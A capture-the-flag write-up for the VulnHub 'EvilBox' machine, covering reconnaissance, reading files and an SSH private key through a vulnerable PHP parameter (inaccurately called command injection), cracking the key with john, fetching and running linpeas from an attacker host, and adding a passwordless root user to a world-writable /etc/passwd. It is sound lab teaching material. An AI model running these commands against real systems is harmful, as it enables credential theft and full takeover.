## EvilBox VulnHub Challenge Writeup

### Overview

The "EvilBox" VulnHub machine is a penetration testing challenge that involves network reconnaissance, web enumeration to discover a command injection vulnerability, extracting an SSH private key, cracking its passphrase, and finally escalating privileges by modifying the `/etc/passwd` file.

### Reconnaissance

#### Network Scanning

I began by identifying the target machine on the network using `netdiscover` to scan the local subnet.

```shellscript
netdiscover -r 192.168.1.0/24
```

The target machine was identified at `192.168.1.21` with the MAC Address `08:00:27:CE:E5:49` (PCS Systemtechnik GmbH / Oracle VirtualBox virtual NIC).

Next, I performed a comprehensive port scan using `nmap` to identify open services and their versions on the target.

```shellscript
nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.21 -p-
```

**Results:**

- **22/tcp**: `ssh` OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
- **80/tcp**: `http` Apache httpd 2.4.38 ((Debian))


#### Web Enumeration (Port 80)

I used `gobuster` to enumerate directories and files on the web server running on port 80.

```shellscript
gobuster dir -u http://192.168.1.21/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
gobuster dir -u http://192.168.1.21/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
```

The scans revealed a `/secret` directory (Status: 301) and `/server-status` (Status: 403). The `raft-medium-files-lowercase.txt` wordlist also found `index.html` and `robots.txt`.

I inspected the `robots.txt` file:

```shellscript
curl http://192.168.1.21/robots.txt
```

The content was simply `Hello H4x0r`. This didn't immediately provide a direct clue, but `H4x0r` might be a hint for a username or password.

I then focused on the `/secret` directory and ran `gobuster` with various extensions:

```shellscript
gobuster dir -u http://192.168.1.21/secret -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -x php,txt,html
gobuster dir -u http://192.168.1.21/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,bak,html
```

This revealed `/secret/index.html` (Status: 200, Size: 4) and, more importantly, `/secret/evil.php` (Status: 200, Size: 0). The zero size of `evil.php` suggested it might be a blank page or a script that processes input.

### Initial Foothold

#### Command Injection via `evil.php`

Given the name `evil.php` and its zero size, I suspected a command injection vulnerability. I used `ffuf` to fuzz for parameters that might allow command execution.

```shellscript
ffuf -u 'http://192.168.1.21/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 0
```

The `ffuf` scan quickly identified `command` as a valid parameter, returning a non-zero size response when `command=/etc/passwd` was used.

I confirmed the command injection by using `curl` to read `/etc/passwd`:

```shellscript
curl 'http://192.168.1.21/secret/evil.php?command=/etc/passwd'
```

This successfully displayed the contents of `/etc/passwd`, confirming the command injection. The output revealed a user named `mowree` with a `/bin/bash` shell:

```plaintext
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
```

I also used the command injection to retrieve the hostname:

```shellscript
curl 'http://192.168.1.21/secret/evil.php?command=/etc/hostname'
```

The hostname was `EvilBoxOne`.

#### SSH Key Discovery and Cracking

Knowing the username `mowree`, I looked for potential SSH keys in their home directory using the command injection:

```shellscript
curl 'http://192.168.1.21/secret/evil.php?command=/home/mowree/.ssh/id_rsa'
```

This command successfully retrieved the contents of `mowree`'s private SSH key, which was encrypted. I saved it to a file named `encrypted.txt`:

```shellscript
curl 'http://192.168.1.21/secret/evil.php?command=/home/mowree/.ssh/id_rsa' > encrypted.txt
```

Next, I used `ssh2john` to convert the encrypted SSH key into a hash format suitable for `john` (John the Ripper):

```shellscript
ssh2john encrypted.txt > hash.txt
```

Then, I used `john` with the `rockyou.txt` wordlist to crack the passphrase:

```shellscript
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

`john` successfully cracked the passphrase: `unicorn`.

#### SSH Login as `mowree`

Before attempting to log in, I set the correct permissions for the private key:

```shellscript
chmod 600 encrypted.txt
```

Finally, I used the cracked SSH key to log in as `mowree`:

```shellscript
ssh -i encrypted.txt mowree@192.168.1.21
```

When prompted for the passphrase, I entered `unicorn`. I successfully logged in as `mowree`.

```plaintext
mowree@EvilBoxOne:~$ ls
user.txt
mowree@EvilBoxOne:~$ cat user.txt
56Rbp0soobpzWSVzKh9YOvzGLgtPZQm
```

This was the user flag: `56Rbp0soobpzWSVzKh9YOvzGLgtPZQm`.

### Privilege Escalation

Once logged in as `mowree`, I began enumerating the system for privilege escalation vectors. I checked `sudo` permissions and SUID binaries.

```shellscript
mowree@EvilBoxOne:~$ sudo -l
-bash: sudo: orden no encontrada
mowree@EvilBoxOne:~$ find / -perm -4000 2> /dev/null
```

`sudo` was not found, and the SUID binaries list did not immediately reveal an obvious exploit. I then ran `linpeas.sh` for a more comprehensive enumeration.

```shellscript
wget http://192.168.1.5/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS provided a lot of information. Among the "Interesting writable files owned by me or writable by everyone", it highlighted `/etc/passwd` as world-writable:

```shellscript
mowree@EvilBoxOne:~$ ls -la /etc/passwd
-rw-rw-rw- 1 root root 1398 ago 16  2021 /etc/passwd
```

The `/etc/passwd` file having `rw-rw-rw-` permissions (world-writable) is a critical vulnerability, as it allows any user to modify it. This means I could add a new root user or change an existing user's UID to 0.

I decided to add a new root user to `/etc/passwd`. I added a new entry with UID 0 and GID 0, and an empty password field (or a known password hash if I wanted to set one).

```shellscript
mowree@EvilBoxOne:~$ echo 'eviluser::0:0:root:/root:/bin/bash' >> /etc/passwd
```

This command adds a new user `eviluser` with UID 0 (root), GID 0 (root), and no password.

Finally, I attempted to switch to the newly created `eviluser`:

```shellscript
mowree@EvilBoxOne:~$ su eviluser
```

Since the password field was empty, it allowed direct login.

```plaintext
root@EvilBoxOne:/home/mowree# id
uid=0(root) gid=0(root) grupos=0(root)
```

I had successfully escalated privileges to root!

### Root Flag

With root privileges, I navigated to the `/root` directory to find the final flag.

```shellscript
root@EvilBoxOne:/home/mowree# cd /root
root@EvilBoxOne:~# ls
root.txt
root@EvilBoxOne:~# cat root.txt
36QtXfdJWvdC0VavlPIApUbDlqTsBM
```

**Root Flag:** `36QtXfdJWvdC0VavlPIApUbDlqTsBM`

### Tools Used

- `netdiscover` - Network discovery
- `nmap` - Port scanning and service version detection
- `gobuster` - Directory and file enumeration
- `ffuf` - Web fuzzing for parameters
- `curl` - Interacting with web services and exploiting command injection
- `ssh2john` - Converting SSH private keys to hash format
- `john` - Cracking password hashes
- `ssh` - Secure shell access
- `linpeas.sh` - Linux privilege escalation enumeration script
- `su` - Switching user


### Flags Found

1. **User Flag:** `56Rbp0soobpzWSVzKh9YOvzGLgtPZQm`
2. **Root Flag:** `36QtXfdJWvdC0VavlPIApUbDlqTsBM`


SuggestionsClose suggestions[data-radix-scroll-area-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-scroll-area-viewport]::-webkit-scrollbar{display:none}Add IntegrationLearn more about command injectionPractice SSH key exploitationDeep dive into /etc/passwd and /etc/shadow vulnerabilitiesExplore other LinPEAS findingsSet up a similar vulnerable VMScroll leftScroll right
